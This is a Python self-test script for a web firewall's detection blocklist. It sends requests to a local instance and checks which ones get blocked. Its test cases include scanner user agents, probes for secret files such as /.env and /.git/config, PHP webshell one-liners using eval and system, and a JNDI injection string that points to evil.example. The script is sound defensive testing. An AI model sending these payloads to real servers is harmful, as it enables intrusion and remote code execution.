#!/usr/bin/env python3
"""检测黑名单规则自测。

把 configs/detect-rules-public.json 导入运行中的实例，然后发一批
恶意/正常请求，检查拦截是否符合预期。

用法：
  python3 scripts/selftest-detect-rules.py --admin http://127.0.0.1:19443 --host d.local:18080

注意：命中会触发自动封禁，脚本每发一个请求就解封一次，
否则后续请求会被封禁逻辑拦住，测出来的结果全是 403。
"""
import argparse
import json
import sys
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
RULES_FILE = ROOT / "configs" / "detect-rules-public.json"

# (说明, method, path, headers, body, 期望状态)
CASES = [
    ("UA sqlmap", "GET", "/", {"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}, None, 403),
    ("UA Nikto", "GET", "/", {"User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"}, None, 403),
    ("UA nuclei", "GET", "/", {"User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}, None, 403),
    ("UA masscan", "GET", "/", {"User-Agent": "masscan/1.3"}, None, 403),
    ("UA gobuster", "GET", "/", {"User-Agent": "gobuster/3.6"}, None, 403),
    ("路径 /.env", "GET", "/.env", {}, None, 403),
    ("路径 /.git/config", "GET", "/.git/config", {}, None, 403),
    ("路径 phpMyAdmin", "GET", "/phpmyadmin/index.php", {}, None, 403),
    ("路径 actuator", "GET", "/actuator/env", {}, None, 403),
    ("路径 备份文件", "GET", "/db/backup.sql", {}, None, 403),
    ("参数 命令执行", "GET", "/?cmd=system($_GET['c'])", {}, None, 403),
    ("Body 一句话", "POST", "/", {"Content-Type": "application/x-www-form-urlencoded"},
     "pass=@eval($_POST['cmd']);", 403),
    ("Body base64 载荷", "POST", "/", {"Content-Type": "application/x-www-form-urlencoded"},
     "z0=base64_decode($_POST['z0'])", 403),
    ("JNDI 注入", "GET", "/${jndi:ldap://evil.example/a}", {}, None, 403),
    # 正常流量：期望「不被拦截」（0 表示只要不是 403 就算通过，因为上游可能返回 404/501）
    ("正常 首页", "GET", "/", {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}, None, 0),
    ("正常 登录页", "GET", "/admin/login", {}, None, 0),
    ("正常 API", "GET", "/api/v1/users", {}, None, 0),
    ("正常 查询参数", "GET", "/?id=123&name=test", {}, None, 0),
    ("正常 表单提交", "POST", "/", {"Content-Type": "application/x-www-form-urlencoded"},
     "username=admin&password=secret", 0),
    ("正常 静态资源", "GET", "/static/app.js", {}, None, 0),
    ("正常 curl UA", "GET", "/", {"User-Agent": "curl/8.4.0"}, None, 0),
    ("正常 python UA", "GET", "/", {"User-Agent": "python-requests/2.31.0"}, None, 0),
    ("正常 搜索 select", "GET", "/?q=select+from+users", {}, None, 0),
    ("正常 下载 tar.gz", "GET", "/download/app.tar.gz", {}, None, 0),
]


def call(admin, method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        admin + path, data=data, method=method,
        headers={"Content-Type": "application/json"} if data else {},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--admin", default="http://127.0.0.1:19443")
    ap.add_argument("--host", required=True, help="被测应用的 Host 头，如 d.local:18080")
    ap.add_argument("--base", default=None, help="请求基地址，默认从 Host 推导")
    args = ap.parse_args()

    base = args.base or ("http://" + args.host.replace(":18080", ":18080"))
    if args.base is None:
        host, _, port = args.host.partition(":")
        base = f"http://127.0.0.1:{port or 80}"

    rules = json.loads(RULES_FILE.read_text(encoding="utf-8"))
    print(f"导入 {len(rules)} 条规则 → {args.admin}")
    for rule in rules:
        code, body = call(args.admin, "POST", "/api/detect-rules", rule)
        if code != 200:
            print(f"  导入失败 {rule['id']}: {code} {body[:120]}")
    print()

    def unban():
        call(args.admin, "DELETE", "/api/bans/127.0.0.1")

    passed = failed = 0
    print(f"{'用例':<22}{'期望':>6}{'实际':>6}  结果")
    print("-" * 52)
    for name, method, path, headers, body, expect in CASES:
        unban()
        data = body.encode() if body else None
        hdrs = {"Host": args.host, **headers}
        req = urllib.request.Request(base + path, data=data, method=method, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                got = r.status
        except urllib.error.HTTPError as e:
            got = e.code
        except Exception as e:  # noqa: BLE001
            got = f"ERR {e}"

        ok = (got != 403) if expect == 0 else (got == expect)
        passed += ok
        failed += not ok
        want = "≠403" if expect == 0 else str(expect)
        print(f"{name:<22}{want:>6}{str(got):>6}  {'OK' if ok else 'FAIL'}")
    unban()
    print("-" * 52)
    print(f"通过 {passed} / {passed + failed}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
